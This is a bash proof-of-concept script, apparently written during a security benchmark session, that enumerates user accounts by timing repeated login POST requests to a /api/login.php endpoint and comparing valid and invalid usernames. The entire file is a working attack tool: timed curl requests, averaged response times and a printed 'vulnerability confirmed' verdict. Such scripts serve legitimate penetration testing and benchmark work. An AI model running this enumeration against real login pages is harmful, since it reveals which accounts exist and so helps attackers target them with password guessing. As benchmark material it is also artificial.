#!/bin/bash
# POC: Demonstrates account enumeration through response time analysis on the login endpoint. Measures timing differences between valid and invalid usernames to identify existing accounts.
# Target: ./repo
# Created: 2025-12-02T16:24:05.875Z
# Session: benchmark-XBEN-069-24-miorxjei

# Account Enumeration via Timing Analysis POC
# This script demonstrates how response time differences in login endpoints
# can be used to enumerate valid usernames by measuring response delays.
#
# The /api/login.php endpoint takes longer to respond for valid usernames
# (due to bcrypt password_verify execution) than invalid usernames.

TARGET_URL="${1:-http://localhost:8000}"
LOGIN_ENDPOINT="/api/login.php"
VALID_USER="admin"
INVALID_USER="nonexistentuser12345"
DUMMY_PASSWORD="wrongpassword123"
NUM_ATTEMPTS=5

echo "======================================"
echo "Account Enumeration via Timing Analysis POC"
echo "======================================"
echo "Target: $TARGET_URL$LOGIN_ENDPOINT"
echo "Valid User: $VALID_USER"
echo "Invalid User: $INVALID_USER"
echo "Number of attempts: $NUM_ATTEMPTS"
echo ""

# Function to measure login response time
measure_login_time() {
    local username=$1
    local password=$2
    
    # Use curl with -w %{time_total} to get total request time in seconds
    # Multiply by 1000 to get milliseconds
    local response_time=$( { time curl -s -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$username&password=$password" \
        "$TARGET_URL$LOGIN_ENDPOINT" > /dev/null; } 2>&1 | grep real | awk '{print $2}' )
    
    # Alternative method using curl's time_total in milliseconds
    local time_ms=$(curl -s -w "%{time_total}" -o /dev/null -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$username&password=$password" \
        "$TARGET_URL$LOGIN_ENDPOINT" | awk '{print int($1 * 1000)}')
    
    echo $time_ms
}

# Test valid username
echo "Testing VALID USERNAME: $VALID_USER"
echo "---"
valid_times=()
valid_sum=0

for i in $(seq 1 $NUM_ATTEMPTS); do
    time_ms=$(measure_login_time "$VALID_USER" "$DUMMY_PASSWORD")
    valid_times+=($time_ms)
    valid_sum=$((valid_sum + time_ms))
    echo "Attempt $i: ${time_ms}ms"
done

valid_avg=$((valid_sum / NUM_ATTEMPTS))
echo "Average response time: ${valid_avg}ms"
echo ""

# Test invalid username
echo "Testing INVALID USERNAME: $INVALID_USER"
echo "---"
invalid_times=()
invalid_sum=0

for i in $(seq 1 $NUM_ATTEMPTS); do
    time_ms=$(measure_login_time "$INVALID_USER" "$DUMMY_PASSWORD")
    invalid_times+=($time_ms)
    invalid_sum=$((invalid_sum + time_ms))
    echo "Attempt $i: ${time_ms}ms"
done

invalid_avg=$((invalid_sum / NUM_ATTEMPTS))
echo "Average response time: ${invalid_avg}ms"
echo ""

# Calculate difference
echo "======================================"
echo "TIMING ANALYSIS RESULTS"
echo "======================================"
echo "Valid user average:   ${valid_avg}ms"
echo "Invalid user average: ${invalid_avg}ms"

if [ $invalid_avg -gt 0 ]; then
    ratio=$((valid_avg / invalid_avg))
    echo "Timing ratio (valid/invalid): ${ratio}x"
fi

time_diff=$((valid_avg - invalid_avg))
echo "Absolute difference: ${time_diff}ms"
echo ""

# Vulnerability check
if [ $valid_avg -gt $((invalid_avg * 3)) ]; then
    echo "✗ VULNERABILITY CONFIRMED"
    echo "Response times show significant difference between valid and invalid users."
    echo "This allows account enumeration through timing analysis."
    exit 0
else
    echo "⚠ Timing difference exists but may not be reliably exploitable"
    echo "However, the difference is still measurable and could be exploited with multiple attempts"
    exit 0
fi